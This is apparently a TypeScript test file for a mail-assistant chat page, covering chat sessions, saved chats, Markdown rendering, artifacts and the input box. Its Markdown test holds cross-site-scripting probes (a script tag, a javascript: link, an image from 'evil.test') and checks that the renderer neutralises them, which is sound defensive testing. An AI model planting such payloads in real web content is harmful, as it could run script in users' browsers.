    expect(titles(t)).toEqual(["first question"]);
    button(t.regions.sidebar, "new-chat").fire("click");
    expect(t.chat.state.sessionId).toBe("session-2");
    expect(t.regions.log.textContent).toContain("Ask about your mail");
    expect(titles(t)).toEqual(["New chat", "first question"]);
    const focused = t.input.focused;
    button(t.regions.sidebar, "chat-open", "first question").fire("click");
    expect(t.chat.state.sessionId).toBe("session-1");
    expect(t.regions.log.textContent).toContain("answer one");
    expect(t.input.focused).toBe(focused + 1);
    const shown = t.regions.sidebar.find("div", "shown")[0] as FElement;
    expect(shown.textContent).toContain("first question");
    // Delete: the first click asks, the second deletes; the shown chat is replaced by a new one.
    button(shown, "chat-delete").fire("click");
    expect(button(t.regions.sidebar, "confirming").textContent).toBe("Delete?");
    button(t.regions.sidebar, "confirming").fire("click");
    expect(titles(t)).toEqual(["New chat"]);
    expect(t.chat.state.sessionId).toBe("session-3");
  });

  it("the toggle flips the sidebar; the artifact panel sets its own attribute", () => {
    const t = page();
    expect(t.regions.app.attributes.get("data-sidebar")).toBe("default");
    expect(t.regions.app.attributes.get("data-artifact")).toBe("closed");
    button(t.regions.header, "toggle-sidebar").fire("click");
    expect(t.regions.app.attributes.get("data-sidebar")).toBe("toggled");
    button(t.regions.header, "toggle-sidebar").fire("click");
    expect(t.regions.app.attributes.get("data-sidebar")).toBe("default");
  });
});

describe("ChatPage: saved chats", () => {
  it("a finished chat is saved and comes back in a new tab, marked as possibly forgotten", async () => {
    const store = new FakeStore();
    store.data.set("profile_id", "not the tab's");
    const t = page({ store });
    await settle(); // the saved chats were read (none)
    ask(t, "what changed?", 3, "t-1", `See [${A}].`, [A]);
    t.runTimers();
    await settle();
    expect([...store.data.keys()]).toEqual(["profile_id", "tern.chat.v1.session-1"]);
    const saved = JSON.stringify(store.data.get("tern.chat.v1.session-1"));
    expect(saved).toContain("what changed?");
    expect(saved).not.toContain("t-1"); // no ternd turn id
    // A second save with nothing changed writes nothing.
    const writes = store.sets.length;
    t.chat.dispatch({ type: "refresh" });
    t.runTimers();
    await settle();
    expect(store.sets.length).toBe(writes);

    const t2 = page({ store, idPrefix: "tab2" });
    await settle();
    expect(titles(t2)).toEqual(["New chat", "what changed?"]);
    expect(t2.regions.log.textContent).toContain("Ask about your mail"); // a new tab opens empty
    button(t2.regions.sidebar, "chat-open", "what changed?").fire("click");
    expect(t2.regions.log.textContent).toContain("what changed?");
    expect(t2.regions.log.find("button", "chip").map((c) => c.textContent)).toEqual(["aaaaaaaa…"]);
    expect(t2.regions.log.find("p", "forgotten")[0]?.textContent).toBe(FORGOTTEN_NOTE);
    // A chip of a restored chat still opens its message.
    (t2.regions.log.find("button", "chip")[0] as FElement).fire("click");
    expect(t2.port().posted.at(-1)).toEqual({ type: "open", req: 3, mid: A });
    // A new question in the restored chat goes to its session id.
    t2.submit("and then?");
    expect(t2.port().posted.at(-1)).toMatchObject({ type: "send", session_id: "session-1" });
    t2.port().deliver({ type: "turn", req: 4, turn_id: "t-2" });
    t2.port().deliver({ type: "done", turn_id: "t-2", citations: [] });
    // Deleting it removes its entry.
    button(t2.regions.sidebar, "chat-delete").fire("click");
    button(t2.regions.sidebar, "confirming").fire("click");
    t2.runTimers();
    await settle();
    expect([...store.data.keys()]).toEqual(["profile_id"]);
  });

  it("a chat closed mid-answer is saved with the turn marked interrupted", async () => {
    const store = new FakeStore();
    const t = page({ store });
    await settle();
    t.submit("long one");
    t.port().deliver({ type: "turn", req: 3, turn_id: "t-1" });
    t.port().deliver({ type: "delta", turn_id: "t-1", text: "partial" });
    t.runTimers();
    await settle();
    const t2 = page({ store, idPrefix: "tab2" });
    await settle();
    button(t2.regions.sidebar, "chat-open", "long one").fire("click");
    expect(t2.regions.log.textContent).toContain("partial");
    expect(t2.regions.log.textContent).toContain("the tab closed before the answer ended");
  });

  it("unreadable entries are left in place and reported", async () => {
    const store = new FakeStore();
    store.data.set("tern.chat.v1.bad", { v: 1, id: "bad", seq: 1, turns: "x" });
    const t = page({ store });
    await settle();
    expect(t.regions.overlay.textContent).toContain(
      "1 saved chat could not be read and was left out.",
    );
    ask(t, "q", 3, "t-1", "a");
    t.runTimers();
    await settle();
    expect(store.data.has("tern.chat.v1.bad")).toBe(true);
    expect(t.logs).toContain("saved chats unreadable: 1");
  });

  it("a failed read turns saving off and says so", async () => {
    const store = new FakeStore();
    store.failGet = true;
    const t = page({ store });
    await settle();
    expect(t.regions.overlay.textContent).toContain("Could not read the saved chats (TypeError)");
    ask(t, "q", 3, "t-1", "a");
    t.runTimers();
    await settle();
    expect(store.sets).toEqual([]);
  });

  it("a failed write shows one notice, however many saves fail", async () => {
    const store = new FakeStore();
    store.failSet = true;
    const t = page({ store });
    await settle();
    ask(t, "q", 3, "t-1", "a");
    t.runTimers();
    await settle();
    ask(t, "q2", 5, "t-2", "b");
    t.runTimers();
    await settle();
    const notices = t.chat.state.notices.filter((n) => n.text.startsWith("Could not save"));
    expect(notices).toHaveLength(1);
    expect(t.logs).toContain("saving chats failed: TypeError");
  });
});

describe("ChatPage: Markdown answers", () => {
  const ANSWER = [
    "# Summary",
    "",
    "- one",
    "- **two** and *three*",
    "",
    "Run `make check` first.",
    "",
    "```py",
    "print(1)",
    "```",
    "",
    "| Name | Count |",
    "|:--|--:|",
    "| a | 2 |",
    "",
    "<script>alert(1)</script>",
    "",
    "[x](javascript:alert(1)) ![p](https://evil.test/p.png) [ok](https://example.test/)",
  ].join("\n");

  it("headings, lists, emphasis, code, code blocks and tables render; no HTML, no URL loads", () => {
    const t = page();
    ask(t, "q", 3, "t-1", ANSWER);
    const log = t.regions.log;
    expect(log.find("p", "heading")[0]?.textContent).toBe("Summary");
    expect(log.find("li").map((l) => l.textContent)).toEqual(["one", "two and three"]);
    expect(log.find("strong").map((s) => s.textContent)).toContain("two");
    expect(log.find("em").map((s) => s.textContent)).toEqual(["three"]);
    expect(log.find("code").map((c) => c.textContent)).toContain("make check");
    expect(log.find("pre")[0]?.textContent).toBe("print(1)");
    expect(log.find("span", "block-title").map((s) => s.textContent)).toEqual(["py", "table"]);
    expect(log.find("th").map((c) => [c.textContent, c.attributes.get("class")])).toEqual([
      ["Name", "align-left"],
      ["Count", "align-right"],
    ]);
    expect(log.find("td").map((c) => c.textContent)).toEqual(["a", "2"]);
    // Raw HTML is text; no element can load or run anything.
    expect(log.textContent).toContain("<script>alert(1)</script>");
    const els = elements(log);
    expect(els.filter((e) => ["script", "a", "img", "iframe"].includes(e.localName))).toEqual([]);
    expect(els.filter((e) => e.attributes.has("href") || e.attributes.has("src"))).toEqual([]);
    expect(log.textContent).not.toContain("evil.test");
    expect(log.textContent).toContain("[image removed]");
    // javascript: is plain text; only the https link is a (confirm-first) link button.
    expect(log.find("button", "link").map((b) => b.textContent)).toEqual(["ok"]);
  });
});

describe("ChatPage: artifacts", () => {
  it("Copy and Open as artifact are disabled while the answer streams", () => {
    const t = page();
    t.submit("q");
    t.port().deliver({ type: "turn", req: 3, turn_id: "t-1" });
    t.port().deliver({ type: "delta", turn_id: "t-1", text: "```sh\nls\n```" });
    expect(button(t.regions.log, "copy").attributes.has("disabled")).toBe(true);
    expect(button(t.regions.log, "open-artifact").attributes.has("disabled")).toBe(true);
    t.port().deliver({ type: "done", turn_id: "t-1", citations: [] });
    expect(button(t.regions.log, "copy").attributes.has("disabled")).toBe(false);
  });

  it("Copy copies the block; Open shows the panel with Copy, Download and Close", async () => {
    const t = page();
    ask(t, "q", 3, "t-1", "```python\nprint(1)\nprint(2)\n```");
    button(t.regions.log, "copy").fire("click");
    await settle();
    expect(t.copied).toEqual(["print(1)\nprint(2)"]);
    expect(button(t.regions.log, "copy").textContent).toBe("Copied");
    t.runTimers();
    expect(button(t.regions.log, "copy").textContent).toBe("Copy");

    button(t.regions.log, "open-artifact").fire("click");
    expect(t.regions.app.attributes.get("data-artifact")).toBe("open");
    const panel = t.regions.artifact;
    expect(panel.find("span", "artifact-title")[0]?.textContent).toBe("python · 2 lines");
    expect(panel.find("pre")[0]?.textContent).toBe("print(1)\nprint(2)");
    button(panel, "copy").fire("click");
    await settle();
    expect(t.copied.at(-1)).toBe("print(1)\nprint(2)");
    button(panel, "download").fire("click");
    expect(t.files).toEqual([{ filename: "tern-snippet.py", text: "print(1)\nprint(2)" }]);
    button(panel, "close").fire("click");
    expect(t.regions.app.attributes.get("data-artifact")).toBe("closed");
    expect(panel.childNodes).toEqual([]);
  });

  it("a failed copy or download is a notice", async () => {
    const t = page({ copyFails: true, saveFails: true });
    ask(t, "q", 3, "t-1", "| a |\n|---|\n| 1 |");
    button(t.regions.log, "copy").fire("click");
    await settle();
    expect(t.regions.overlay.textContent).toContain("Could not copy (NotAllowedError).");
    button(t.regions.log, "open-artifact").fire("click");
    button(t.regions.artifact, "download").fire("click");
    expect(t.regions.overlay.textContent).toContain(
      "Could not download tern-table.md (TypeError).",
    );
  });
});

describe("ChatPage: composer", () => {
  it("the input grows with its text up to a limit and shrinks after a send", () => {
    const t = page();
    t.input.scrollHeight = 90;
    t.input.fire("input", {});
    expect(t.input.style.height).toBe("90px");
    t.input.scrollHeight = 900;
    t.input.fire("input", {});
    expect(t.input.style.height).toBe("240px");
    t.input.scrollHeight = 34;
    t.submit("sent");
    expect(t.input.value).toBe("");
    expect(t.input.style.height).toBe("34px");
  });

  it("Enter while an input method composes does not send", () => {
    const t = page();
    t.input.value = "日本";
    t.input.fire("keydown", {
      key: "Enter",
      shiftKey: false,
      isComposing: true,
      preventDefault: () => {
        throw new Error("must not prevent");
      },
    });
    expect(t.port().posted).toHaveLength(2); // status and info only
    expect(t.input.value).toBe("日本");
  });
});
